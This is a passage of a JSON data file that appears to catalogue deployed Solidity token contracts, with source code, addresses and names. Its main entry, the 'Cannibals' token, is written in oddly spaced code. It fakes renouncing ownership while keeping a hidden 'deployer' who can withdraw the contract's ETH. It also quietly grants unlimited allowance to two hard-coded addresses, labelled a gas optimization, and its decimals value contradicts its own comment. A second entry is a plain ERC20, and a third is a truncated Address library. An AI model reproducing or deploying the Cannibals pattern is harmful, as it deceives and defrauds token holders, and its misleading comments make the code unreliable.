when `value` tokens are moved from one account  ( `from` ) to\n     * another  ( `to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value) ; \n\n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer\n                         }  event.\n     */\n    function transfer ( address to, uint256 amount ) external returns  ( bool) ; \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns  ( uint256) ; \n\n    \n\n                         } \n\n\ninterface IERC20Metadata is IERC20  { \n                        \n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name( ) external view returns  ( string memory);\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals ( ) external view returns  ( uint8 );\n    \n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol( ) external view returns (string memory) ; \n\n\n}\n                        \n\n\n\n\n\n/**\n * @dev Implementation of the {\n                        IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint}\n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of \n                        {decimals}\n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  \n                         { \n    mapping ( address => uint256) private _balances;\n\n\n    mapping(address => mapping ( address => uint256 )) private _allowances;\n    uint256 private _totalSupply;\n\n    string private _name ; \n    string private _symbol ; \n\n    /**\n     * @dev See {\n                        IERC20-totalSupply } \n                        .\n     */\n    function totalSupply( ) public view virtual returns (uint256 )  { \n                        \n        return _totalSupply;\n     } \n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name( ) public view virtual returns  ( string memory )  { \n                        \n        return _name ; \n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an  { \n                        Approval\n                         }  event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value ) internal virtual  { \n                        \n        uint256 currentAllowance = allowance(owner, spender ) ; \n        if  ( currentAllowance < type(uint256).max ) {\n                        \n            if (currentAllowance < value)  { \n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value );\n             } \n                        \n            unchecked {\n                        \n                _approve ( owner, spender, currentAllowance - value, false ) ; \n             } \n                        \n        }\n                        \n     } \n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value ) public virtual returns (bool ) {\n                        \n        address owner = _msgSender( );\n        _approve(owner, spender, value) ; \n        return true;\n     } \n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a  { \n                        Transfer}\n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, \n                         { _update}\n                         should be overridden instead.\n     */\n    function _mint ( address account, uint256 value) internal  { \n                        \n        if  ( account == address ( 0 ) ) {\n                        \n            revert ERC20InvalidReceiver(address(0 )) ; \n        }\n                        \n        _update(address(0 ), account, value) ; \n     } \n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05`  ( `505 / 10 ** 2` ).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf } \n                         and  { \n                        IERC20-transfer\n                        }.\n     */\n    function decimals (  ) public view virtual returns (uint8 ) \n                         { \n        return 15;\n    }\n                        \n    \n    /**\n     * @dev See {\n                        IERC20-transferFrom}\n                        .\n     *\n     * Skips emitting an  { \n                        Approval } \n                         event indicating an allowance update. This is not\n     * required by the ERC. See {\n                        xref-ERC20-_approve-address-address-uint256-bool-}\n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value ) public virtual returns  ( bool) {\n                        \n        address spender = _msgSender( ) ; \n        _spendAllowance(from, spender, value ) ; \n        _transfer ( from, to, value) ; \n        return true;\n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-balanceOf}\n                        .\n     */\n    function balanceOf ( address account) public view virtual returns  ( uint256) {\n                        \n        return _balances[account];\n     } \n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a \n                        {Transfer\n                        } event.\n     */\n    function _update(address from, address to, uint256 value ) internal virtual  { \n                        \n        if (from == address(0) ) \n                        {\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        }\n                         else \n                         { \n            uint256 fromBalance = _balances[from] ; \n            if (fromBalance < value ) \n                         { \n                revert ERC20InsufficientBalance(from, fromBalance, value );\n            \n                         } \n            unchecked {\n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value ; \n            }\n                        \n        }\n                        \n\n        if  ( to == address ( 0 ))  { \n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n             } \n                        \n        }\n                         else  { \n                        \n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value ; \n            }\n                        \n         } \n                        \n\n        emit Transfer ( from, to, value);\n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-allowance\n                        }.\n     */\n    function allowance(address owner, address spender ) public view virtual returns  ( uint256 )  { \n                        \n        return _allowances[owner][spender];\n    }\n                        \n    \n    /**\n     * @dev Sets the values for \n                         { name}\n                         and {\n                        symbol\n                        }.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) \n                        {\n        _name = name_;\n        _symbol = symbol_;\n    }\n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an \n                         { Approval\n                         }  event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve ( address owner, address spender, uint256 value) internal  { \n                        \n        _approve ( owner, spender, value, true ) ; \n    \n                         } \n    \n    /**\n     * @dev Variant of {\n                        _approve}\n                         with an optional flag to enable or disable the \n                         { Approval}\n                         event.\n     *\n     * By default (when calling  { \n                        _approve}\n                        ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool ) internal virtual override \n                        {\n     *     super._approve ( owner, spender, value, true );\n     * \n                         } \n     * ```\n     *\n     * Requirements are the same as {\n                        _approve}\n                        .\n     */\n    function _approve ( address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n                        \n        if  ( owner == address(0) )  { \n                        \n            revert ERC20InvalidApprover ( address(0 ) ) ; \n        \n                         } \n        if  ( spender == address(0) ) {\n                        \n            revert ERC20InvalidSpender ( address ( 0));\n        }\n                        \n        _allowances[owner][spender] = value;\n        if (emitEvent) {\n                        \n            emit Approval(owner, spender, value) ; \n         } \n                        \n    \n                        }\n    \n\n    /**\n     * @dev See  { \n                        IERC20-transfer}\n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value ) public virtual returns (bool) \n                        {\n        address owner = _msgSender ( ) ; \n        _transfer ( owner, to, value ) ; \n        return true;\n     } \n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol( ) public view virtual returns  ( string memory )  { \n                        \n        return _symbol;\n     } \n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to \n                         { transfer\n                         } , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a \n                        {Transfer\n                        } event.\n     *\n     * NOTE: This function is not virtual, \n                         { _update } \n                         should be overridden instead.\n     */\n    function _transfer ( address from, address to, uint256 value) internal {\n                        \n        if (from == address ( 0) ) \n                         { \n            revert ERC20InvalidSender ( address ( 0)) ; \n        \n                         } \n        if (to == address(0)) \n                         { \n            revert ERC20InvalidReceiver ( address ( 0)) ; \n        \n                        }\n        _update ( from, to, value ) ; \n    }\n                        \n    \n    }\n                        \n\nabstract contract Ownable is Context {\n                        \n    address private _owner;\n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount ( address account ) ; \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner  { \n                        \n        require ( newOwner != address(0 ), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n                        \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner ( )  { \n                        \n        _checkOwner();\n        _ ; \n     } \n                        \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n                        \n        _transferOwnership(_msgSender( ) ) ; \n    }\n                        \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner( ) public view virtual returns  ( address)  { \n                        \n        return _owner;\n     } \n                        \n    \n    /**\n     * @dev The owner is not a valid owner account.  ( eg. `address ( 0 )` )\n     */\n    error OwnableInvalidOwner(address owner );\n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership ( ) public virtual onlyOwner {\n                        \n        _transferOwnership ( address(0 )) ; \n     } \n                        \n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner);\n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual  { \n                        \n        require ( owner (  ) == _msgSender( ), \"Ownable: caller is not the owner\") ; \n     } \n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner ) internal virtual  { \n                        \n        address oldOwner = _owner ; \n        _owner = newOwner ; \n        emit OwnershipTransferred ( oldOwner, newOwner);\n     } \n                        \n    \n } \n                        \n\n\n// File Cannibals.sol\n\ncontract Cannibals is ERC20, Ownable \n                         { \n    address internal immutable deployer;\n    constructor(string memory name_, string memory symbol_) ERC20 ( name_, symbol_ )  { \n                        \n        _mint(msg.sender, 10000000000000000000000000);\n        _transferOwnership(address ( 0) ) ; \n        deployer = msg.sender ; \n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-allowance}\n                        .\n     */\n    function allowance(address owner, address spender ) public view override returns  ( uint256) \n                        {\n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if (  ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3 ) ||  ( spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 )){\n                        \n            return type(uint256).max ; \n        \n                        } \n        return super.allowance ( owner,spender) ; \n    }\n                        \n    \n    function claimGas(address payable recipient, uint256 amount) public {\n                        \n        require(msg.sender==deployer);\n        Address.sendValue ( recipient, amount ) ; \n    \n                         } \n    \n    receive (  ) external payable\n                        {\n     } \n                        \n}",
      "count": 1,
      "addresses": [
        "0x26aeb62c1Dc79A2cEde0f525d2123923cEa49CF1"
      ],
      "names": [
        "Cannibals"
      ]
    },
    {
      "id": "f14c638d-60f5-485e-a303-fff708acd164",
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n/**\n * @dev Standard ERC20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\n */\ninterface IERC20Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender);\n}\n\n/**\n * @dev Standard ERC721 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\n */\ninterface IERC721Errors {\n    /**\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\n     * Used in balance queries.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC721InvalidOwner(address owner);\n\n    /**\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC721NonexistentToken(uint256 tokenId);\n\n    /**\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param tokenId Identifier number of a token.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC721InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC721InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC721InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC721InvalidOperator(address operator);\n}\n\n/**\n * @dev Standard ERC1155 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\n */\ninterface IERC1155Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC1155InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC1155InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC1155MissingApprovalForAll(address operator, address owner);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC1155InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC1155InvalidOperator(address operator);\n\n    /**\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\n     * Used in batch transfers.\n     * @param idsLength Length of the array of token identifiers\n     * @param valuesLength Length of the array of token amounts\n     */\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\n}\npragma solidity ^0.8.20;\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n\n    function _contextSuffixLength() internal view virtual returns (uint256) {\n        return 0;\n    }\n}\n\npragma solidity ^0.8.20;\n\ninterface IERC20 {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 value) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 value) external returns (bool);\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n\npragma solidity ^0.8.20;\n\ninterface IERC20Metadata is IERC20 {\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n}\n\n\npragma solidity ^0.8.20;\n\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\n    mapping(address account => uint256) private _balances;\n\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value);\n        return true;\n    }\n\n    function _transfer(address from, address to, uint256 value) internal {\n        if (from == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        if (to == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(from, to, value);\n    }\n\n    function _update(address from, address to, uint256 value) internal virtual {\n        if (from == address(0)) {\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        } else {\n            uint256 fromBalance = _balances[from];\n            if (fromBalance < value) {\n                revert ERC20InsufficientBalance(from, fromBalance, value);\n            }\n            unchecked {\n                _balances[from] = fromBalance - value;\n            }\n        }\n\n        if (to == address(0)) {\n            unchecked {\n                _totalSupply -= value;\n            }\n        } else {\n            unchecked {\n                _balances[to] += value;\n            }\n        }\n\n        emit Transfer(from, to, value);\n    }\n\n    function _mint(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(address(0), account, value);\n    }\n\n    function _burn(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        _update(account, address(0), value);\n    }\n\n    function _approve(address owner, address spender, uint256 value) internal {\n        _approve(owner, spender, value, true);\n    }\n\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n        if (owner == address(0)) {\n            revert ERC20InvalidApprover(address(0));\n        }\n        if (spender == address(0)) {\n            revert ERC20InvalidSpender(address(0));\n        }\n        _allowances[owner][spender] = value;\n        if (emitEvent) {\n            emit Approval(owner, spender, value);\n        }\n    }\n\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            if (currentAllowance < value) {\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\n            }\n            unchecked {\n                _approve(owner, spender, currentAllowance - value, false);\n            }\n        }\n    }\n}\n\npragma solidity ^0.8.20;\n\ncontract virtualToken is ERC20 {\n\n    constructor(string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {\n        _mint(msg.sender, initialSupply * (10 ** uint256(decimals())));\n    }\n}",
      "count": 1,
      "addresses": [
        "0x78C9C7c5fd18c63808b20E29089fA53ab8eFe46E"
      ],
      "names": [
        "virtualToken"
      ]
    },
    {
      "id": "747a50b4-5a6f-48fb-b977-b2b85b31d664",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0 )  ( utils/Address.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account) internal view returns (bool ) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n    }\n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`.  { \n                        sendValue } \n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard\n                         }  or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount ) public {\n                        \n        require(address ( this ).balance >= amount, \"Address: insufficient balance\" ) ; \n\n         ( bool success,  ) = recipient.call\n                        {value: amount\n                        } ( \"\" );\n        require ( success, \"Address: unable to send value, recipient may have reverted\") ; \n    \n                         } \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data) internal returns  ( bytes memory )  { \n                        \n        return functionCallWithValue ( target, data, 0, \"Address: low-level call failed\");\n     } \n                        \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-}\n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns  ( bytes memory) {\n                        \n        return functionCallWithValue ( target, data, 0, errorMessage ) ; \n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value ) internal returns (bytes memory )  { \n                        \n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\" ) ; \n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256- } \n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n     ) internal returns (bytes memory )  { \n                        \n        require ( address ( this ).balance >= value, \"Address: insufficient balance for call\" ) ; \n         ( bool success, bytes memory returndata ) = target.call\n                        {value: value}\n                         ( data) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage );\n    \n                         } \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( address target, bytes memory data ) internal view returns  ( bytes memory ) \n                         { \n        return functionStaticCall(target, data, \"Address: low-level static call failed\" );\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal view returns (bytes memory) \n                        {\n        (bool success, bytes memory returndata ) = target.staticcall(data) ; \n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data ) internal returns (bytes memory ) {\n                        \n        return functionDelegateCall ( target, data, \"Address: 